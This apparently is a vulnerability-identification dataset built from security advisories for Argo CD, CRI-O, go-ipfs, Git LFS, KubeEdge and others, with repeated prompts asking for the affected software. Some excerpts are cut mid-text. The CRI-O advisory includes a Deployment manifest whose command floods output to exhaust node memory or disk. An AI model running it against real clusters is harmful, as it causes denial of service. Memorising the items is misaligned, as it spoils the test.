08/08/2022.

Out of memory panics cannot be recovered from. Applications that use functions from the `_strvals_` package in the Helm SDK can have a Denial of Service attack when they use this package and it panics.\n\n### Impact\n\nThe `_strvals_` package contains a parser that turns strings into Go structures. For example, the Helm client has command line flags like `--set`, `--set-string`, and others that enable the user to pass in strings that are merged into the values. The `_strvals_` package converts these strings into structures Go can work with. Some string inputs can cause array data structures to be created causing an out of memory panic.\n\nApplications that use the `_strvals_` package in the Helm SDK to parse user supplied input can suffer a Denial of Service when that input causes a panic that cannot be recovered from.\n\nThe Helm Client will panic with input to `--set`, `--set-string`, and other value setting flags that causes an out of memory panic.

Please identify the software name affected by it. Input: ### Impact\n\n**Versions impacted**\n  * `<=` go-car@v0.3.3\n  * `<=` go-car@v2.3.0\n\n**Description**\n\nDecoding CAR data from untrusted user input can cause:\n\n- Panics:\n  - Out of bound memory access\n  - Out of memory\n  - Divide by zero\n- Excessive memory usage\n\nSuch panics can be triggered by intentionally malformed CARv1 data, including CARv1 data within a CARv2 container; and also CARv2 data with excessively large indexes.\n\nThese vulnerabilities are not known to be exploited in the wild and were discovered primarily with the use of code fuzzing tooling.\n\n**Details**\n\n**Out of bound memory access** (OOB), **out of memory** (OOM) panics or **excessive memory usage** can be triggered by decode of malformed CARv1 headers, malformed CARv1 sections, and malformed CIDv0 data used in CARv1 sections. This also applies to CARv1 data within a CARv2 container.\n\nAdditionally, we wish to use this security advisory to make clear to consumers of CARv2 format data that **loading CARv2 indexes from untrusted sources is dangerous and should be avoided**. Where CAR data indexes are required, they should be regenerated locally. Out of memory (OOM) panics or excessive memory usage can be triggered by decode of intentionally malformed CARv2 indexes, or CARv2 indexes which are larger than available system memory (i.e. parallelization of CARv2 decodes may increase such a vulnerability).\n\n### Patches\n\n**Fixed versions**\n\n* `>=` go-car@v0.4.0\n* `>=` go-car@v2.4.0\n\n**Description of user-facing changes**\n\n***go-car@v0.4.0*** imposes a fixed maximum header length and section length of 32 MiB during decode. Headers exceeding this length will cause the decoder to return an error as the initial CAR decode occurs. Sections (the combination of CID and block data) exceeding this length will cause the decoder to return an error as that section is read.\n\nThe default maximum of 32 MiB may be changed _globally_ in an application instance by directly changing the `MaxAllowedSectionSize` variable in the `github.com/ipld/go-car/util` package.\n\nWe recommend that users of go-car@v0 upgrade to go-car@v2, where these maximums may be applied per-decode rather than globally.\n\n***go-car@v2.4.0*** imposes a default maximum header length of 32 MiB and a default maximum section length of 8 MiB. Headers exceeding this length will cause the decoder to return an error as the initial CAR decode occurs. Sections (the combination of CID and block data) exceeding this length will cause the decoder to return an error as that section is read.\n\nThe default values may be adjusted by supplying a `MaxAllowedHeaderSize(x)` or `MaxAllowedSectionSize(y)` option to any decode function that accepts options. These include:\n\n* `OpenReader()`\n* `NewReader()`\n* `NewBlockReader()`\n* `ReadVersion()`\n* `LoadIndex()`\n* `GenerateIndex()`\n* `ReadOrGenerateIndex()`\n* `WrapV1()`\n* `ExtractV1File()`\n* `ReplaceRootsInFile()`\n* `blockstore/NewBlockReader()`\n* `blockstore/NewReadOnly()`\n* `blockstore/OpenReadOnly()`\n* `blockstore/OpenReadWrite()`\n\nPlease be aware that the default values are **very generous** and may be lowered where a user wants to impose restrictions closer to typical sizes.\n\n* Typical header lengths should be in the order of 60 bytes, but the CAR format does not specify a maximum number of roots a header may contain. The default maximum of 32 MiB makes room for novel uses of the CAR format.\n* Typical IPLD block sizes are under 2 MiB, and it is generally recommended that they not be above 1 MiB for maximum interoperability (e.g. there are hard limitations when sharing IPLD data with IPFS). CARv1 sections are the concatenation of CID and block bytes. The default maximum section length of 8 MiB makes room for novel IPLD data.\n\n***go-car@v2.4.0*** introduces a new API that can be used to inspect a CAR and check for various errors, including those detailed in this advisory. The `Reader#Inspect(bool)` API returns a `Stats` object with various details about the CAR, such as its version, number of blocks, and details about codecs and multihashers used. When its argument is `true`, it will also perform a full hash consistency check of blocks contained within the CAR to ensure they match the CIDs. When `false`, block data is skipped over so a scan will likely be more efficient than reading blocks through a `BlockReader` if statistics and/or validity checking is all that's required. Note that `Inspect()` does minimal checking of index data; the strong recommendation is that if index data is untrusted then it should be regenerated.\n\n***go-car@v2.4.0*** also includes additional documentation regarding the dangers of consuming CARv2 index data from untrusted sources and a recommendation to regenerate indexes of CAR data from such sources where an index is required.\n\n### Workarounds\n\nThere are no workarounds for vulnerabilities in impacted versions decoding CARv1 data. Users of impacted versions should avoid accepting CAR data from untrusted sources.\n\nOOM or excessive memory usage vulnerabilities resulting from CARv2 index parsing in impacted versions can be avoided by not reading indexes from CARv2 data from untrusted sources.\n\n### References\n\nDetails on the CARv1 and CARv2 formats, including the composition of CARv1 headers and sections, and CARv2 indexes can be found in the CAR format specifications: https://ipld.io/specs/transport/car/\n\n### For more information\n\nIf you have any questions or comments about this advisory please open an issue in [go-car](https://github.com/ipld/go-car)..

An attacker could use this weakness to make a request that will return an HTTP response with a large body and cause DoS of CloudCore. In the HTTP Handler API, the rest handler makes a request to a pre-specified handle. The handle will return an HTTP response that is then read into memory. The consequence of the exhaustion is that CloudCore will be in a denial of service.\nOnly an authenticated user of the cloud can make an attack. It will be affected only when users enable `router` module in the config file `cloudcore.yaml` as below.\n```\nmodules:\n  ...\n  router:\n    enable: true\n```\n\n### Patches\nThis bug has been fixed in Kubeedge 1.11.1, 1.10.2, 1.9.4.

Input: # Impact\n\n## Impacts for versions starting with v1.0.0\nAll unpatched versions of Argo CD starting with v1.0.0 are vulnerable to an improper access control bug, allowing a malicious user to potentially escalate their privileges to admin-level.\n\nTo perform the following exploits, an authorized Argo CD user must have push access to an Application's source git or Helm repository or `sync` and `override` access to an Application. Once a user has that access, different exploitation levels are possible depending on their other RBAC privileges:\n\n1. If that user has `update` access to the Application, they can modify any resource on the Application's destination cluster. If the destination cluster is or can be made to be the same as the cluster hosting Argo CD, the user can escalate their Argo CD permissions to admin-level.\n2. If the user has `delete` access to the Application, they can delete any resource on the Application's destination cluster. (This exploit is possible starting with v0.8.0.)\n3. If the user has `get` access to the Application, they can view any resource on the Application's destination cluster (except for the contents of Secrets) and list [actions](https://argo-cd.readthedocs.io/en/stable/operator-manual/resource_actions/) available for that resource.\n4. If the user has `get` access to the Application, they can view the logs of any Pods on the Application's destination cluster.\n5. If the user has `action/{some action or *}` access on the Application, they can run an action for any resource (which supports the allowed action(s)) on the Application's destination cluster. (Some actions are available in Argo CD by default, and others may be configured by an Argo CD admin.)\n\nSee the [Argo CD RBAC documentation](https://argo-cd.readthedocs.io/en/stable/operator-manual/rbac/#rbac-resources-and-actions) for an explanation of the privileges available in Argo CD.\n\n## Events exploit\nA related exploit is possible for a user with `get` access to an Application **even if they do not have access to the Application's source git or Helm repository or `sync` and `override` access to the Application**. The user can access any Event in the Application's destination cluster if they know the involved object's name, UID, and namespace.\n\n## Impacts for versions starting with v0.8.0\nThe same bug exists starting with v0.8.0, but only the following exploits were possible before v1.0.0:\n\n- The `delete exploit` (#\u20602 above).\n- The logs exploit (#\u20604 above).\n- The Events exploit described above.\n\n## Impacts for versions starting with v0.5.0\nThe same bug exists starting with v0.5.0 (when RBAC was implemented), but only the Events exploit described above was possible before v0.8.0.\n\nPatches\nA patch for this vulnerability has been released in the following Argo CD versions:\n\n- v2.3.2\n- v2.2.8\n- v2.1.14\n\n**Versions 2.0.x and earlier users**: See the changelog for links to upgrade instructions for your version. It is imperative to upgrade quickly, but some limited mitigations are described in the next section.\n\n**argo-helm chart users**: Argo CD users deploying v2.3.x with argo-helm can upgrade the chart to version 4.2.2. Argo CD 2.2 and 2.1 users can set the global.image.tag value to the latest in your current release series (v2.2.8, or v2.1.14). Since charts for the 2.2 and 2.1 series are no longer maintained, you will need to either leave the value override in place or upgrade to the 4.x chart series (and therefore to Argo CD 2.3).\n\n## Workarounds\nThe only certain way to avoid the vulnerability is to upgrade.\n\n## Mitigations\n\n- To avoid privilege escalation:\n    - Limit who has push access to Application source repositories or sync + override access to Applications.\n- Limit which repositories are available in projects where users have update access to Applications.\n    - To avoid unauthorized resource inspection/tampering:\n    - Limit who has delete, get, or action access to Applications.\n\nThese mitigations can help limit potential damage, but they are not a substitute for upgrading.

Please identify the software name affected by it. Input: ### Impact\n\nAll versions of Argo CD starting with v0.4.0 are vulnerable to an improper certificate validation bug which could cause Argo CD to trust a malicious (or otherwise untrustworthy) OIDC provider.\n\n(Note: external OIDC provider support was added in v0.11.0. Before that version, the notes below apply only to the bundled Dex instance.)\n\nYou are impacted if 1) have SSO enabled and 2) insecure mode is _not_ enabled on the API server. In this case, certificate verification is skipped when connecting to your OIDC provider for the following tasks: verifying auth tokens on API requests and handling SSO login flows. If you are using the bundled Dex instance but have _not_ set the `--dex-server` flag on the API server to an HTTPS address, then certificate verification is not being skipped (because [TLS is not enabled by default for the bundled Dex instance](https://github.com/argoproj/argo-cd/issues/9424)).\n\nArgo CD sends requests to the configured OIDC provider (either the bundled Dex instance or an external provider) to 1) retrieve the [OpenID configuration](https://openid.net/specs/openid-connect-discovery-1_0.html#ProviderConfig), 2) to retrieve the OIDC provider's key set (at the location determined by the [OIDC provider's configured `jwks_uri`](https://openid.net/specs/openid-connect-discovery-1_0.html#ProviderMetadata)), and 3) (during an SSO login) to exchange an authorization code for a token.\n\n(Note: Starting with v2.3.0, certificate verification is _not_ skipped when handling an SSO login flow if 1) you are not using the bundled Dex OIDC provider and 2) you have set `oidc.config.rootCA` in the `argocd-cm` ConfigMap. Certificate verification is still skipped when verifying tokens on API calls.)\n\nSkipping certificate verification when communicating with the OIDC provider opens Argo CD to a variety of risks. For example, if an attacker can successfully intercept, decrypt, and respond to requests bound for the configured OIDC provider (a machine-in-the-middle attack), they could theoretically issue a \"valid\" admin token. Verifying the OIDC provider's certificate provides an extra layer of protection against such an attack.\n\n### Patches\n\nA patch for this vulnerability has been released in the following Argo CD versions:\n\n* v2.4.5\n* v2.3.6\n* v2.2.11\n\n**Note:**\n\nTo preserve backwards compatibility, this patch adds a `oidc.tls.insecure.skip.verify` option to the `argocd-cm` ConfigMap. The default is `\"false\"`. Before resorting to setting this, you should try to get certificate verification to work. If you are using the bundled Dex instance, user your Argo CD API server's [TLS configuration](https://argo-cd.readthedocs.io/en/stable/operator-manual/tls/) since the API server acts as a reverse proxy to Dex. If you are using an external OIDC provider, [set the `rootCA` config](https://argo-cd.readthedocs.io/en/stable/operator-manual/user-management/#configuring-a-custom-root-ca-certificate-for-communicating-with-the-oidc-provider).\n\nIf these fail, be sure you are aware of the risks before setting `oidc.tls.insecure.skip.verify: \"true\"`.\n\n### Workarounds\n\nThere is no complete workaround besides upgrading.\n\n#### Partial mitigation when using an external OIDC provider\n\nIf you are using an external OIDC provider (not the bundled Dex instance), then you can mitigate the issue by setting the `oidc.config.rootCA` field in the `argocd-cm` ConfigMap. If your OIDC provider's certificate is self-signed or otherwise invalid, you must set the rootCA to a certificate that enables verification. If the OIDC provider's certificate passes _without_ an additional root CA, then you can set `oidc.config.rootCA` to a bogus non-empty string such as `\"force cert verification\"`. The API server will log a warning, but otherwise things should work fine.\n\nExample:\n\n```yaml\nmetadata:\n  name: argocd-cm\ndata:\n  oidc.config: |\n    ...\n    rootCA: |\n      force cert verification\n```\n\nThis mitigation _only_ forces certificate validation when the API server handles login flows. It does not force certificate verification when verifying tokens on API calls. To fully resolve the vulnerability, you must upgrade.\n\n### References\n\n* [Argo CD SSO configuration documentation](https://argo-cd.readthedocs.io/en/stable/operator-manual/user-management/#sso)\n\n### Credits\n\n@jannfis and @crenshaw-dev discovered the vulnerability when reviewing notes from ADA Logics' security audit of the Argo project sponsored by CNCF and facilitated by OSTIF.

Who is impacted?_\n\nBleve includes HTTP utilities under bleve/http package, that are used by its sample application. \n(https://github.com/blevesearch/bleve-explorer)\nThese HTTP methods paves way for exploitation of a node\u2019s filesystem where the bleve index resides, \nif the user has used bleve\u2019s own HTTP (bleve/http) handlers for exposing the access to the indexes. \nFor instance, the CreateIndexHandler (http/index_create.go) and DeleteIndexHandler (http/index_delete.go) \nenable an attacker to create a bleve index (directory structure) anywhere where the user running the server \nhas the write permissions and to delete recursively any directory owned by the same user account.\n \nUsers who have used the bleve/http package for exposing access to bleve index without the explicit \nhandling for the Role Based Access Controls(RBAC) of the index assets would be impacted.\n\n\n### Patches\n_Has the problem been patched? What versions should users upgrade to?_\n\n**No**. The http package is purely intended to be used for demonstration purposes. \nAnd bleve is never designed to be handling the RBACs or it was ever advertised to be used in that way. \nHence the collaborators of this project have decided to stay away from adding any authentication or \nauthorization to bleve project at the moment.\n\n### Workarounds\n_Is there a way for users to fix or remediate the vulnerability without upgrading?_\n\nThe bleve/http package is mainly for demonstration purposes and it lacks exhaustive validation of the user \ninputs as well as any authentication and authorization measures. \nSo it is recommended to not use that in production use cases.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue [here](https://github.com/blevesearch/bleve/issues).\n* Email us at [mailto:security@couchbase.com, fts-team@couchbase.com].\n.

Please identify the software name affected by it. Input: ### Impact\n\nAll versions of Argo CD starting with v0.7.0 are vulnerable to an uncontrolled memory consumption bug, allowing an authorized malicious user to crash the [repo-server](https://argo-cd.readthedocs.io/en/stable/operator-manual/architecture/#repository-server) service. The repo-server is a critical component of Argo CD, so crashing the repo-server effectively denies core Argo CD services (such as syncing Application updates).\n\nTo achieve denial of service, the attacker must be an authenticated Argo CD user authorized to deploy Applications from a repository which contains (or can be made to contain) a large file. \n\n### Patches\n\nA patch for this vulnerability has been released in the following Argo CD versions:\n\n* v2.4.1\n* v2.3.5\n* v2.2.10\n* v2.1.16\n\n**The patch introduces a new `reposerver.max.combined.directory.manifests.size` config parameter, which you should tune before upgrading in production.** It caps the maximum total file size of .yaml/.yml/.json files in directory-type (raw manifest) Applications. The default max is `10M` per Application. This max is designed to keep any single app from consuming more than 3G of memory in the repo-server (manifests consume more space in memory than on disk). The 300x ratio assumes a maliciously-crafted manifest file. If you only want to protect against accidental excessive memory use, it is probably safe to use a smaller ratio.\n\nIf your organization uses directory-type Applications with very many manifests or very large manifests then **check the size of those manifests and tune the config parameter before deploying this change to production**. When testing, make sure to do a \"hard refresh\" in either the CLI or UI to test your directory-type App. That will make sure you're using the new max logic instead of relying on cached manifest responses from Redis.\n\n### Workarounds\n\nThere is no workaround besides upgrading.\n\nTo mitigate the issue, carefully limit 1) who can configure repos (determined by [RBAC](https://argo-cd.readthedocs.io/en/stable/getting_started/)), 2) which repos are allowed (determined by [Project](https://argo-cd.readthedocs.io/en/stable/user-guide/projects/) limitations), and 3) who has push access to those repos (determined by your SCM provider configuration).\n\n### Credits\n\nDisclosed by ADA Logics in a security audit of the Argo project sponsored by CNCF and facilitated by OSTIF.

Please identify the software name affected by it. Input: ### Description\nAn ExecSync request runs a command in a container and returns the output to the Kubelet. It is used for readiness and liveness probes within a pod. The way CRI-O runs ExecSync commands is through conmon. CRI-O asks conmon to start the process, and conmon writes the output to disk. CRI-O then reads the output and returns it to the Kubelet.\n\nIf the output of the command is large enough, it is possible to exhaust the memory (or disk usage) of the node. The following deployment is an example yaml file that will output around 8GB of \u2018A\u2019 characters, which would be written to disk by conmon and read by CRI-O.\n\n```yaml\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-deployment100\nspec:\n  selector:\n    matchLabels:\n      app: nginx\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.14.2\n        lifecycle:\n          postStart:\n            exec:\n              command: [\"/bin/sh\", \"-c\", \"seq 1 50000000`; do echo -n 'aaaaaaaaaaaaaaaa'; done\"]\n```\n\n### Impact\nIt is possible for the node to be exhausted of memory or disk space, depending on the node the command is being run on. What is further problematic is that the memory and disk usage aren't attributed to the container, as this file and its processing are implementation details of CRI-O. The consequence of the exhaustion is that other services on the node, e.g. other containers, will be unable to allocate memory and thus causing a denial of service.\n\n### Patches\nThis vulnerability will be fixed in 1.24.1, 1.23.3, 1.22.5, v1.21.8, v1.20.8, v1.19.7\n\n### Workarounds\nAt the time of writing, no workaround exists other than ensuring only trusted images are used.\n\n### References\nhttps://github.com/containerd/containerd/security/advisories/GHSA-5ffw-gxpp-mxpf\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [the CRI-O repo](http://github.com/cri-o/cri-o/issues)\n* To make a report, email your vulnerability to the private\n[cncf-crio-security@lists.cncf.io](mailto:cncf-crio-security@lists.cncf.io) list\nwith the security details and the details expected for [all CRI-O bug\nreports](https://github.com/cri-o/cri-o/blob/main/.github/ISSUE_TEMPLATE/bug-report.yml).\n\n### Credits\nDisclosed by Ada Logics in a security audit sponsored by CNCF and facilitated by OSTIF.\n.

Starting with 2.3.0, repository paths are randomized, and read permissions are restricted when manifests are not being actively being generated. This makes it very difficult to craft and use a malicious symlink.\n\n#### Best practices which can mitigate risk\n\n* Limit who has push access to manifest repositories.\n* Limit who is allowed to configure new source repositories.\n\n### Credits\n\nDisclosed by ADA Logics in a security audit of the Argo project sponsored by CNCF and facilitated by OSTIF.

Input: ### Impact\n\nAll versions of Argo CD starting with v0.11.0 are vulnerable to a variety of attacks when an SSO login is initiated from the Argo CD CLI or UI. The vulnerabilities are due to the use of insufficiently random values in parameters in Oauth2/OIDC login flows. In each case, using a relatively-predictable (time-based) seed in a non-cryptographically-secure pseudo-random number generator made the parameter less random than required by the relevant spec or by general best practices. In some cases, using too short a value made the entropy even less sufficient. (The specific weak parameters are listed in the References section.)\n\nThe attacks on login flows which are meant to be mitigated by these parameters are difficult to accomplish but can have a high impact (potentially granting an attacker admin access to Argo CD). The CVSS for this Security Advisory assumes the worst-case scenario.\n\n### Patches\n\nA patch for this vulnerability has been released in the following Argo CD versions:\n\n* v2.4.1\n* v2.3.5\n* v2.2.10\n* v2.1.16\n\n### Workarounds\n\nThere are no workarounds. You must upgrade to a patched version to resolve the vulnerability.\n\n### References\n\nThese are the insufficiently-random parameters:\n\n1. (since 0.11.0) The [`state` parameter](https://datatracker.ietf.org/doc/html/rfc6749#section-4.1.1) generated by the `argocd login` command for Oauth2 login used a non-cryptographically secure source of entropy and generated a parameter that was too short to provide the entropy [required in the spec](https://datatracker.ietf.org/doc/html/rfc6749#section-10.10). This parameter is a \"recommended\" part of the Oauth2 flow and helps protect against cross-site request forgery attacks.\n2. (since 1.7.2, when PKCE was added) The [`code_verifier` parameter](https://datatracker.ietf.org/doc/html/rfc7636#section-4.1) generated by the `argocd login` command for Oauth2+PKCE login used a non-cryptographically secure source of entropy. The attacks mitigated by PKCE [are complex but have been observed in the wild](https://datatracker.ietf.org/doc/html/rfc7636#section-1).\n3. (since 0.11.0) The [`state` parameter](https://datatracker.ietf.org/doc/html/rfc6749#section-4.1.1) generated by the Argo CD API server during a UI-initiated Oauth2 login used a non-cryptographically secure source of entropy and generated a parameter that was too short to provide the entropy [required in the spec](https://datatracker.ietf.org/doc/html/rfc6749#section-10.10). This parameter is a \"recommended\" part of the Oauth2 flow and helps protect against cross-site request forgery attacks.\n4. (since 0.11.0) The [`nonce` parameter](https://openid.net/specs/openid-connect-core-1_0.html#ImplicitAuthRequest) generated by the Argo CD API server during a UI-initiated Oauth2 implicit flow login used a non-cryptographically secure source of entropy and generated a parameter that was too short to provide sufficient entropy.

Input: ### Impact\nThis vulnerability only affects customers using Fleet for continuous delivery with authenticated Git and/or Helm repositories.\n\nA security vulnerability ([CVE-2022-29810](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29810)) was discovered in `go-getter` library in versions prior to [`v1.5.11`](https://github.com/hashicorp/go-getter/releases/tag/v1.5.11) that exposes SSH private keys in base64 format due to a failure in redacting such information from error messages. The vulnerable version of this library is used in Rancher through Fleet in versions of Fleet prior to [`v0.3.9`](https://github.com/rancher/fleet/releases/tag/v0.3.9). This issue affects Rancher versions 2.5.0 up to and including 2.5.12 and from 2.6.0 up to and including 2.6.3.\n\nWhen Git and/or Helm authentication is configured in [Fleet](https://rancher.com/docs/rancher/v2.6/en/deploy-across-clusters/fleet/) and Fleet is used to deploy a git repo through `Continuous Delivery`, the affected `go-getter` version will expose the configured SSH private key secret if Fleet fails to download the git repo due to a misconfigured URL. The exposed SSH key is logged in base64 format as a query parameter together with the git URL. The credentials can be seen in Rancher UI and in Fleet's deployment pod logs.\n\n### Patches\nPatched versions include releases 2.5.13, 2.6.4 and later versions.\n\n### Workarounds\nThere is not a direct mitigation besides upgrading to the patched Rancher versions. Until you are able to upgrade, limit access in Rancher to trusted users and carefully validate the URLs you are using are correct. Please note that the SSH key might still be compromised in valid URLs if the service goes down or a connection error happens when pulling from the repos.\n\n**Note:** If you believe that SSH keys might have been exposed in your environment, it's highly advised to rotate them.\n\n### Credits\nThis issue was found and reported by Dagan Henderson from Raft Engineering.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Reach out to [SUSE Rancher Security team](https://github.com/rancher/rancher/security/policy) for security related inquiries.\n* Open an issue in [Rancher](https://github.com/rancher/rancher/issues/new/choose) repository.\n* Verify our [support matrix](https://www.suse.com/suse-rancher/support-matrix/all-supported-versions/) and [product support lifecycle](https://www.suse.com/lifecycle/)..

Input: ### Impact\n\nAllows admin API access to the IPFS node.\n\n### Who ?\n\nThis affects people running the  [docker-compose.yaml](https://github.com/ipfs/go-ipfs/blob/master/docker-compose.yaml) service in an environment where the docker host is directly attached to a public or untrusted IP.  In the vulnerable version, the private API endpoint is publicly forwarded by exposing it as `0.0.0.0:5001` on the host machine.  \n\nIf the host machine is hidden behind a firewall or NAT (and the LAN is trusted for NAT), this is not an immediate issue because of the protection from the firewall or NAT.  That said, we still recommend users update to follow security best practices of not putting unnecessary dependency on a working firewall.\n\n### Patches\nThis issue is in [docker-compose.yaml](https://github.com/ipfs/go-ipfs/blob/master/docker-compose.yaml).  Users need to replace their current `docker-compose.yaml` file with a version `0.12.1` or later.\n\nThere is no need to update any of the binaries. Users running previous versions like `0.12.0` or earlier can download the `0.12.1` `docker-compose.yaml` file.  You can replace a vulnerable `docker-compose.yaml` file with a the new one with:\n\n```\ncurl https://raw.githubusercontent.com/ipfs/go-ipfs/v0.12.1/docker-compose.yaml > docker-compose.yaml\n```\n\n### How to test if you are vulnerable\n#### Binding check on the host\nOn the host machine, while IPFS is running, run as root:\n\n```bash\nnetstat -lnp | grep \":5001\"\n```\n\nThe output will be a list of listeners bound to `:5001`.\nYou then need to check that those listeners are private and preferably even localhost IPs.\n\u26a0\ufe0f If this listener is on `0.0.0.0` or a public IP you are very likely vulnerable.\n\n#### Remote hailing\nWhile IPFS is running, you can try to contact the API from a remote machine. (Replace `1.2.3.4` with your node public IP.  Or if you want to test in an untrusted NAT, then substitute the LAN IP instead.)\n\n```bash\ncurl -X POST http://1.2.3.4:5001/api/v0/version\n```\n\n\u26a0\ufe0f If you see any json outputted (e.g.,  `{\"Commit\": \"<string>\",\"Golang\": \"<string>\",\"Repo\": \"<string>\",\"System\": \"<string>\",\"Version\": \"<string>\"}`), then you are vulnerable.\n\nIf it **fails**, then you are safe.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Please first read https://docs.ipfs.io/reference/http/api/ about best practices\n* Ask in [IPFS Discord #ipfs-chatter](https://discord.gg/ipfs)\n* Open an issue in [go-ipfs](https://github.com/ipfs/go-ipfs)\n.

Please identify the software name affected by it. Input: ### Impact\n\nA bug was found in CRI-O where containers were incorrectly started with non-empty inheritable Linux process capabilities, creating an atypical Linux environment and enabling programs with inheritable file capabilities to elevate those capabilities to the permitted set during `execve(2)`.  Normally, when executable programs have specified permitted file capabilities, otherwise unprivileged users and processes can execute those programs and gain the specified file capabilities up to the bounding set.  Due to this bug, containers which included executable programs with inheritable file capabilities allowed otherwise unprivileged users and processes to additionally gain these inheritable file capabilities up to the container's bounding set.  Containers which use Linux users and groups to perform privilege separation inside the container are most directly impacted.\n\nThis bug did not affect the container security sandbox as the inheritable set never contained more capabilities than were included in the container's bounding set.\n\n\n### Patches\n\nThis bug will been fixed in the following versions of CRI-O:\n- v1.24.0\n\nUsers should update to the version corresponding to their minor release as soon as possible.  Running containers should be stopped, deleted, and recreated for the inheritable capabilities to be reset.\n\nThis fix changes CRI-O behavior such that containers are started with a more typical Linux environment.  Refer to `capabilities(7)` for a description of how capabilities work.  Note that permitted file capabilities continue to allow for privileges to be raised up to the container's bounding set and that processes may add capabilities to their own inheritable set up to the container's bounding set per the rules described in the manual page.  In all cases the container's bounding set provides an upper bound on the capabilities that can be assumed and provides for the container security sandbox.\n\n### Workarounds\n\nThe entrypoint of a container can be modified to use a utility like `capsh(1)` to drop inheritable capabilities prior to the primary process starting.\n\n### Credits\n\nCRI-O would like to thank [Andrew G. Morgan](https://github.com/AndrewGMorgan) for responsibly disclosing this issue, as well as the Moby (Docker Engine) project for working with the other container engines in coordinating a fix.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n* [Open an issue](https://github.com/cri-o/cri-o/issues/new)\n* Email us at [cncf-crio-security@lists.cncf.io](cncf-crio-security@lists.cncf.io) if you think you\u2019ve found a security bug\n\n------------------\n\nhttps://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:L\n4.8/Medium\n\n|Metric\t|Value\t|Comments\t|\n|---\t|---\t|---\t|\n|Attack Vector (AV)\t|Local\t|An attacker requires local control to launch a container with files that have inheritable capabilities. \t|\n|Attack Complexity (AC)\t|Low\t|Modifying a file to have inheritable capabilities is not difficult.\t|\n|Privileges Required (PR)\t|Low\t|An attacker requires enough privilege to cause a container to be launched with a compromised image.

Please identify the software name affected by it. Input: ### Impact\ngo-ipfs nodes with versions 0.10.0, 0.11.0, 0.12.0, or 0.12.1 can crash when trying to traverse certain malformed graphs due to an issue in the go-codec-dagpb dependency.  Vulnerable nodes that work with these malformed graphs may crash leading to denial-of-service risks.\n\nThis particularly impacts nodes that download or export data that is controlled by external user input as there is the possibility that a malicious user of those services could (intentionally or unintentionally) cause the node to traverse a malformed graph. Some notable use cases include public gateways and pinning services which fetch data on behalf of users, as well as applications such as IPFS Companion which load data based on a user visiting a website with links to IPFS URLs.\n\n### Patches\nVersions v0.11.1 and v0.12.2 both resolve this issue. This should make it easy to upgrade, even if you have not yet performed the v0.12.0 migration.\n\nFor those running on forked versions of go-ipfs or who are on v0.10.0 and are having trouble with the v0.11.0 breaking changes, simply updating the version of `go-codec-dagpb` you are using to >=v1.3.2 should resolve the issue.\n\nAny users of libraries within the go-ipfs ecosystem, even if not the go-ipfs package or binary itself, may be affected and should upgrade their dependency on go-codec-dagpb. You can check if your Go module has a dependency on `go-codec-dagpb` by running a command such as `go mod graph | grep go-codec-dagpb` in your module root.\n\n### Workarounds\nThe best way to workaround this issue is to control exposure to any endpoints that allow for arbitrary IPLD traversals. This primarily includes the HTTP RPC API (https://docs.ipfs.io/reference/http/api ) and the Gateway API.  If you are exposing those APIs, then do so within an environment where only trusted users and applications you control have access to it.  You should be safe as long as your users and applications do not create malformed graphs, which should not happen using standard `go-ipfs` tooling.\n\nIf you previously had a more open access environment, then closing off access will only be sufficient if both of the following are true:\n* The experimental GraphSync feature is disabled (https://github.com/ipfs/go-ipfs/blob/master/docs/experimental-features.md#graphsync) \n* The only data being accessed is non-malformed data\n\n### References\nSee also the [go-codec-dagpb security advisory](https://github.com/ipld/go-codec-dagpb/security/advisories/GHSA-g3vv-g2j5-45f2).\n\n### For more information\nIf you have any questions or comments about this advisory:\n\n* Ask in [IPFS Discord #ipfs-chatter](https://discord.gg/ipfs)\n* Open an issue in [go-ipfs](https://github.com/ipld/go-ipfs).

Please identify the software name affected by it. Input: ### Impact\nOn Windows, if Git LFS operates on a malicious repository with a `..exe` file as well as a file named `git.exe`, and `git.exe` is not found in `PATH`, the `..exe` program will be executed, permitting the attacker to execute arbitrary code.  This does not affect Unix systems.\n\nSimilarly, if the malicious repository contains files named `..exe` and `cygpath.exe`, and `cygpath.exe` is not found in `PATH`, the `..exe` program will be executed when certain Git LFS commands are run.\n\nMore generally, if the current working directory contains any file with a base name of `.` and a file extension from `PATHEXT` (except `.bat` and `.cmd`), and also contains another file with the same base name as a program Git LFS intends to execute (such as `git`, `cygpath`, or `uname`) and any file extension from `PATHEXT` (including `.bat` and `.cmd`), then, on Windows, when Git LFS attempts to execute the intended program the `..exe`, `..com`, etc., file will be executed instead, but only if the intended program is not found in any directory listed in `PATH`.\n\nThe vulnerability occurs because when Git LFS detects that the program it intends to run does not exist in any directory listed in `PATH` then Git LFS passes an empty string as the executable file path to the Go `os/exec` package, which contains a bug such that, on Windows, it prepends the name of the current working directory (i.e., `.`) to the empty string without adding a path separator, and as a result searches in that directory for a file with the base name `.` combined with any file extension from `PATHEXT`, executing the first one it finds.\n\n(The reason `..bat` and `..cmd` files are not executed in the same manner is that, although the Go `os/exec` package tries to execute them just as it does a `..exe` file, the Microsoft Win32 API `CreateProcess()` family of functions have an undocumented feature in that they apparently recognize when a caller is attempting to execute a batch script file and instead run the `cmd.exe` command interpreter, passing the full set of command line arguments as parameters.  These are unchanged from the command line arguments set by Git LFS, and as such, the intended program's name is the first, resulting in a command line like `cmd.exe /c git`, which then fails.)\n\nGit LFS has resolved this vulnerability by always reporting an error when a program is not found in any directory listed in `PATH` rather than passing an empty string to the Go `os/exec` package in this case.\n\nThe bug in the Go `os/exec` package has been reported to the Go project and is expected to be patched after this security advisory is published.\n\n### Patches\nThe problem was introduced in v2.12.1 and is patched in v3.1.3 and v3.1.4.  Users of affected versions should upgrade to v3.1.4.\n\n### Workarounds\nThere are no known workarounds at this time.\n\n### References\n* https://github.com/git-lfs/git-lfs/security/advisories/GHSA-6rw3-3whw-jvjj\n* https://nvd.nist.gov/vuln/detail/CVE-2022-24826\n* https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-24826\n* 